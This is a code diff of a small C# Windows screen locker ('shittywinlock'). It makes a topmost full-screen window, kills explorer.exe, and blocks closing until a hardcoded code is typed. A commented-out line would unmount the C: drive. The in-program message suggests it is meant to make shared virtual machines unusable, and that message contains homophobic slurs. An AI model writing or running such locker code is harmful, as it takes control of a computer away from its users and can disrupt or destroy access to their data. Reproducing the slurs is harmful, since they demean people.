@@ -13,18 +13,21 @@ namespace shittywinlock {
     public partial class Form1 : Form {
 
         string pravelniiCod = "73556087355608123";
+        bool joeBiden = false;
         public Form1() {
             this.FormBorderStyle = FormBorderStyle.None;
             this.WindowState = FormWindowState.Maximized;
+            this.FormClosing += Form1_FormClosing;
             TopMost = true;
 //          Registry.CurrentUser.CreateSubKey(@"");
             InitializeComponent();
             System.Diagnostics.Process.Start("taskkill.exe", "/f /im explorer.exe");
-//          System.Diagnostics.Process.Start("CMD.exe", "mountvol C: /d");
+//          System.Diagnostics.Process.Start("mountvol.exe", "C: /d");
         }
 
         private void typedPravCod() {
-            System.Diagnostics.Process.Start("explorer.exe");
+            System.Diagnostics.Process.Start(System.IO.Path.Combine(Environment.GetEnvironmentVariable("windir"), "explorer.exe")); ;
+            joeBiden = true;
             Application.Exit();
         }
 
@@ -83,11 +86,11 @@ namespace shittywinlock {
         }
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e) {
-            e.Cancel = true;
+            if(!joeBiden) e.Cancel = true;
         }
 
         private void button13_Click(object sender, EventArgs e) {
-            MessageBox.Show("If you see this running, most probably a forkie or a ratfag was here before. This VM is no longer usable, do a vote reset", "About", MessageBoxButtons.OK);
+            MessageBox.Show("If you see this running, most probably a forkie, a pornfag or an anydeskfag was here before. This VM is no longer usable, do a vote reset", "About", MessageBoxButtons.OK);
         }
     }
 }
